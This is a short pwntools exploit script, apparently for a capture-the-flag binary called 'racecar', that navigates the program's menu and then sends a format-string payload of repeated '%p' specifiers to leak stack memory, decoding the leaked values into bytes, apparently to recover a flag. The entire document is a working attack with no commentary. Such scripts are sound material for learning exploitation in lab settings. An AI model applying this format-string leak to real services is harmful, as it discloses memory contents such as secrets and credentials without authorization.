from pwn import *
from icecream import ic

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

elf = ELF('racecar', checksec=0)

if True:
    p = gdb.debug(elf.path, aslr=False, gdbscript='\n'.join([
        # 'b*0x56556002',
        'c',
    ])) # type: tube
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=0)
else: 
    p = remote('178.128.37.153', 32225)

# p = process('./racecar')

p.sendlineafter(b'Name: ', b'sam')
p.sendlineafter(b'Nickname: ', b'sam')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'2')

p.recvuntil(b"You ")
result = p.recvuntil(b' ', drop=True)

if result != b'won':
    p.close()

p.sendlineafter(b'> ', ('%p ' * 40).encode())
p.recvline_contains(b'whole world to know this:')
addresses = p.recvall().decode().split(' ')
p.close()

data = b''
for i, address in enumerate(addresses):
    ic(i, address)
    try:
        data += p32(int(address[2:], 16))
    except:
        pass

ic(data)
